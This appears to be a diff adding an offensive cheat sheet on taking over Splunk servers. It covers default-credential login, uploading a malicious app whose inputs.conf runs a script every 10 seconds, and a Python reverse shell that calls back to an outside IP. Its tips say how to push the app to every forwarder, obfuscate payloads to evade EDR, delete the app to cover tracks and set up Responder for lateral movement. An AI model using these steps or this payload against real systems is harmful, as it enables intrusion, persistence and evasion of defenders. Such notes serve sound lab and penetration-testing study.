@@ -1,0 +1,78 @@
+🧠 “Got This → Do That” – Splunk Edition
+✅ Got This: Port 8000 or 8089 is open
+Do This:
+
+Hit http://target:8000
+
+Look for:
+
+Login page → try admin:changeme, weak creds
+
+No login? Free version = no auth, proceed to abuse
+
+Look for version info in footer or HTML comments
+
+✅ Got This: Logged in or unauth access to Splunk
+Do This:
+
+Check for access to:
+
+App install: /en-US/manager/search/apps/local
+
+Search dashboards or custom inputs
+
+✅ Got This: Access to install app from file
+Do This (Windows target):
+
+Create splunk_shell/ with bin/ and default/
+
+Inside bin/:
+
+Add reverse shell .ps1 (PowerShell one-liner)
+
+Add run.bat to trigger .ps1
+
+Inside default/:
+
+Add inputs.conf with:
+
+ini
+Copy
+Edit
+[script://.\bin\run.bat]
+disabled = 0
+interval = 10
+sourcetype = shell
+Tar it up → tar -cvzf updater.tar.gz splunk_shell/
+
+Upload via web UI → gain SYSTEM shell
+
+✅ Got This: Linux Splunk host instead?
+Do This:
+
+Replace with rev.py in bin/:
+
+python
+Copy
+Edit
+import sys,socket,os,pty
+ip="10.10.14.15"
+port=443
+s=socket.socket()
+s.connect((ip,int(port)))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn('/bin/bash')
+⚠️ Pro Tips:
+🪝 If Splunk = Deployment Server → you can push your custom app to every forwarder
+
+🕳️ Inputs with interval = 10 = persistent shell every 10s
+
+🔐 Obfuscate payload or encode .ps1 to help evade EDR
+
+📜 Delete app post-shell to cover tracks
+
+🧠 Bonus: try adding LLMNR/Responder setup script in your .ps1 if lateral hunting
+
+Quick Metaphor to Lock It In:
+Splunk’s “apps” are like plugins with root/SYSTEM keys. You just sneak your shell in as a “plugin,” and the system happily runs it on your behalf. It’s less about hacking Splunk and more about convincing Splunk to hack itself.
+
